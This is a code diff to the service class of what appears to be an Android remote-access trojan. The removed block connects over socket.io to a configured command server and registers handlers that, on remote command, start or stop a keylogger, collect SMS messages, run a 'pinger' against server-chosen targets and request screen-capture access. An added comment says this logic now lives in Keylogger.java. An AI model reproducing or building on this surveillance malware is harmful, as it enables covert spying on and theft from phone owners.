@@ -46,92 +46,9 @@ public class MyService extends Service {
     @RequiresApi(api = Build.VERSION_CODES.O)
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        // Socket.io Handlers
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                try {
-//                    sock = IO.socket("http://"+getString(R.string.MY_IP)+":"+getString(R.string.MY_PORT));
-//                    sock.connect();
-                    Connecting.connect(getString(R.string.MY_IP),getString(R.string.MY_PORT),reconnectTime);
-                } catch (InterruptedException e) {
-                    e.printStackTrace();
-                }
-                sock = Connecting.getSock();
-//                Log.d(TAG, "run: "+(sock==null));
-
-                // Getting neccessory permissions
-                try {
-                    mProjectionManager =  (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
-                    mProjection = mProjectionManager.getMediaProjection(intent.getIntExtra("resultCode", Activity.RESULT_CANCELED),intent.getParcelableExtra("data"));
-//                capture = new Capture(sock,getApplicationContext(),mProjectionManager,mProjection,2,handler);
-//                capture.setup();
-                } catch (Exception e) {
-                    Log.e(TAG, "MediaProjection failed: " + e.getMessage());
-                }
-
-                // Ping Handler
-                sock.on("ping", new Emitter.Listener() {
-                    @Override
-                    public void call(Object... args) {
-                        try {
-                            JSONArray array = (JSONArray) new JSONArray((String) args[0]);
-                            if(array.getString(0).equals("start")){
-                                pinger.changeVars(array.getString(1),array.getInt(2),array.getInt(3));
-                                pinger.start();
-                            }else{
-//                            Log.d(TAG, "Stop Ping");
-                                pinger.stop();
-                            }
-                        } catch (JSONException e) {
-                            e.printStackTrace();
-//                        Log.d(TAG, "ERROR : "+e.getMessage());
-                        }
-                    }
-                });
-
-                // Logger Handler
-                sock.on("logger", new Emitter.Listener() {
-                    @Override
-                    public void call(Object... args) {
-//                        Log.d(TAG, "logger");
-                        try {
-                            JSONArray array = (JSONArray) new JSONArray((String) args[0]);
-                            if(array.getString(0).equals("start")){
-                                Keylogger.start();
-//                            Log.d(TAG, "calling by sock");
-                            }else{
-                                Keylogger.stop();
-                            }
-                        } catch (JSONException e) {
-                            e.printStackTrace();
-                        }
-                    }
-                });
-
-                sock.on("click", new Emitter.Listener() {
-                    @Override
-                    public void call(Object... args) {
-                        Log.d(TAG, "click");
-                    }
-                });
-                
-                sock.on("sms", new Emitter.Listener() {
-                    @Override
-                    public void call(Object... args) {
-                         try {
-                            JSONArray array = (JSONArray) new JSONArray((String) args[0]);
-                            if(array.getString(0).equals("start")){
-                                getSMS();
-                            }
-                        } catch (JSONException e) {
-                            e.printStackTrace();
-                        }
-                    }
-                });
-            }
-        }).start();
-
+        // NOTE: Socket connection and handlers moved to Keylogger.java to avoid duplicate connections
+        // This service now only handles foreground notification
+        
         NotificationChannel channel = new NotificationChannel(
                 channelID,channelID, NotificationManager.IMPORTANCE_LOW
         );
